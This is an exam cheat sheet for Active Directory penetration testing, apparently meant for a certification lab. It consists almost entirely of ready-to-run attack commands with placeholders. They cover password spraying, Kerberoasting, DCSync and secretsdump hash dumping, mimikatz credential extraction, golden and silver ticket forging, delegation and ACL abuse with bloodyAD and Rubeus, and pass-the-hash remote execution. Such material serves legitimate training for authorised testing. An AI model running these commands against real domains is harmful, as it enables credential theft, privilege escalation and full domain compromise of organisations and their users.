# 00 — Quick Reference & Exam Command Cheat Sheet

> [!TIP]
> **Exam Strategy:** Replace placeholders (`<DOMAIN>`, `<USER>`, `<TARGET>`, `<AES256_KEY>`, `<DOMAIN_SID>`, `<KRBTGT_AES256>`) with your lab/exam values.

---

## PowerView vs. ActiveDirectory Module

| Action | PowerView | AD Module |
| :--- | :--- | :--- |
| **Current Domain** | `Get-Domain` | `Get-ADDomain` |
| **Domain Controllers** | `Get-DomainController` | `Get-ADDomainController` |
| **All Users** | `Get-DomainUser` | `Get-ADUser -Filter *` |
| **Specific User** | `Get-DomainUser -Identity <USER>` | `Get-ADUser -Identity <USER> -Properties *` |
| **Kerberoastable SPNs** | `Get-DomainUser -SPN` | `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` |
| **AdminCount Users** | `Get-DomainUser -AdminCount` | `Get-ADUser -Filter {AdminCount -eq 1}` |
| **Domain Computers** | `Get-DomainComputer` | `Get-ADComputer -Filter * -Properties *` |
| **Domain Groups** | `Get-DomainGroup` | `Get-ADGroup -Filter *` |
| **Group Members** | `Get-DomainGroupMember -Identity <GROUP>` | `Get-ADGroupMember -Identity <GROUP>` |
| **OUs** | `Get-DomainOU` | `Get-ADOrganizationalUnit -Filter *` |
| **GPOs** | `Get-DomainGPO` | `Get-ADGPO -All` |
| **Domain Trusts** | `Get-DomainTrust` | `Get-ADTrust -Filter *` |
| **Forest Trusts** | `Get-ForestTrust` | `Get-ADForest | %{ Get-ADTrust -Filter * }` |
| **Object ACLs** | `Get-DomainObjectAcl -Identity <NAME>` | `(Get-ACL 'AD:\CN=...').Access` |

---

## ACL Privilege Abuse Matrix

| Privilege | Impact | Command |
| :--- | :--- | :--- |
| **GenericAll** | Full control | Modify group membership, reset password, shadow credentials |
| **GenericWrite** | Update attributes | `Set-DomainObject -Identity <TARGET> -Set @{'scriptpath'='...'}` |
| **WriteDacl** | Modify DACL | `Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All` |
| **WriteOwner** | Take ownership | `Set-DomainObjectOwner -TargetIdentity <TARGET> -PrincipalIdentity <USER>` |
| **ForceChangePassword** | Reset password | `Set-ADAccountPassword -Identity <USER> -Reset -NewPassword (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)` |
| **AddMembers** | Add to group | `Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'` |
| **DCSync** | Replicate hashes | `lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt` |

---

## NetExec (nxe / cme) — Initial SMB Enumeration

```bash
# Check SMB signing (find hosts with signing disabled for relaying)
nxe smb <TARGET_IP_OR_RANGE> --gen-relay-list hosts.txt

# Null session & Guest session share enumeration
nxe smb <TARGET_IP> -u '' -p '' --shares
nxe smb <TARGET_IP> -u 'Guest' -p '' --shares

# Authenticated share listing & logged-on users
nxe smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --shares --loggedon-users

# Spider shares for password/config files
nxe smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --spider "C$" --pattern "unattend*,*.kdbx,*.config,pass*"
```

---

## Script & Module Loading

```powershell
. C:\AD\Tools\PowerView.ps1
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-Command -Module ActiveDirectory
```

---

## Kerbrute — User Enumeration & Password Spraying

```bash
# Enumerate valid usernames against DC
kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt

# Password spray a single password against all users
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt 'Password123!'

# Brute-force a single user
kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> passwords.txt <USER>
```

---

## Impacket Quick Reference

```bash
# Kerberoasting
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# AS-REP Roasting
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt

# DCSync / Secret Dump
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH> -just-dc-ntlm

# Remote Execution (with password or hash)
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET> "whoami"

# Golden Ticket
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator

# RBCD
impacket-rbcd <DOMAIN>/<USER>:<PASSWORD> -delegate-to <TARGET>$ -delegate-from FakeMachine$ -dc-ip <DC_IP> -action write
impacket-getST <DOMAIN>/FakeMachine$:'P@ss!' -spn cifs/<TARGET> -impersonate Administrator -dc-ip <DC_IP>

# Silver Ticket
impacket-ticketer -spn cifs/<TARGET_FQDN> -nthash <SERVICE_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
```

---

## Bloody-AD — ACL & Object Manipulation

```bash
# Add user to group
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>'

# Set password (ForceChangePassword)
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set password '<TARGET_USER>' 'NewP@ss123!'

# Grant DCSync rights
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add dcsync '<TARGET_USER>'

# Add GenericAll on object
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add genericAll 'OU=<TARGET_OU>' '<TARGET_USER>'

# Set owner
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set owner '<TARGET_OBJECT>' '<TARGET_USER>'

# RBCD — set msDS-AllowedToActOnBehalfOfOtherIdentity
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add rbcd '<TARGET_COMPUTER>$' 'FakeMachine$'

# Read GMSA password
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> get object '<GMSA_ACCOUNT>$' --attr msDS-ManagedPassword
```

---

## Credential Extraction

```cmd
mimikatz.exe "sekurlsa::ekeys" "exit"
SafetyKatz.exe "sekurlsa::ekeys" "exit"
```

```text
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::secrets
```

---

## Kerberos Ticket Abuse

### Overpass-the-Hash
```text
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe
```
```cmd
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /ptt
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### DCSync
```text
lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt
```

### Golden Ticket
```cmd
Rubeus.exe golden /aes256:<KRBTGT_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
```

### Silver Ticket
```cmd
Rubeus.exe silver /service:http/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN>
```

> [!IMPORTANT]
> For WMI via Silver Ticket, generate tickets for **both** `HOST` and `RPCSS` services.

---

## Constrained Delegation (S4U)

```powershell
Get-NetUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
```cmd
Rubeus.exe s4u /user:<DELEGATED_ACCOUNT> /aes256:<KEY> /impersonateuser:Administrator /msdsspn:time/<TARGET_DC> /ptt
```

---

## AD CS Certificate Abuse

```cmd
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<CERT_PFX> /password:<CERT_PASSWORD> /outfile:<TGT_FILE> /domain:<DOMAIN> /dc:<DC_IP> /ptt
```

---

## Post-Exploitation Credentials & Vaults

```cmd
vaultcmd /list
vaultcmd /listproperties:"Web Credentials"
```

```text
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Local Privilege Escalation (PowerUp)

```powershell
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name '<VULNERABLE_SERVICE>' -Username '<DOMAIN>\<USER>' -Verbose
```

---

## Local Admin & Session Discovery

```powershell
Find-LocalAdminAccess
Get-NetSession
Find-DomainShare
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```cmd
winrs -r:<TARGET> cmd
```

```powershell
Enter-PSSession -ComputerName <TARGET>
```
